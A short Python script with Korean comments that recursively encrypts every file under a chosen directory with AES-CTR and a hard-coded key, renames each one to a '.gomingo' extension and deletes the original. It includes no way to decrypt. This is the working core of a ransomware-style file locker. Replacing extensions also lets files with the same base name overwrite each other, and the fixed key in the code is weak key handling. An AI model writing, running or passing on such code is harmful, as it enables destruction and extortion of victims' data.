from Crypto.Cipher import AES
from Crypto.Util import Counter
import os

def encrypt_file(input_file, output_file, key):
    # AES 블록 크기
    block_size = 16

    # 암호화할 파일 열기
    with open(input_file, 'rb') as f_in:
        plaintext = f_in.read()

    # 초기화 벡터(IV) 생성
    iv = os.urandom(block_size)

    # 카운터 생성
    counter = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))

    # AES 암호화 객체 생성
    cipher = AES.new(key, AES.MODE_CTR, counter=counter)

    # 암호문 생성
    ciphertext = cipher.encrypt(plaintext)

    # 초기화 벡터와 암호문을 출력 파일에 저장
    with open(output_file, 'wb') as f_out:
        f_out.write(iv + ciphertext)

def add_extension(file_path, new_extension):
    file_name, _ = os.path.splitext(file_path)
    return file_name + new_extension

def encrypt_files_in_directory(directory, key):
    for root, _, files in os.walk(directory):
        for filename in files:
            input_file = os.path.join(root, filename)
            output_file = add_extension(input_file, '.gomingo')
            encrypt_file(input_file, output_file, key)
            os.remove(input_file)

if __name__ == '__main__':
    directory = input('암호화할 파일이 있는 최상위 디렉토리 경로 입력: ') 
    key = b'Sixteen byte key' 

    encrypt_files_in_directory(directory, key)
    print(f'{directory} 디렉토리와 하위 디렉토리 내의 파일을 성공적으로 암호화하고 파일 확장자명을 .gomingo로 변경했습니다.')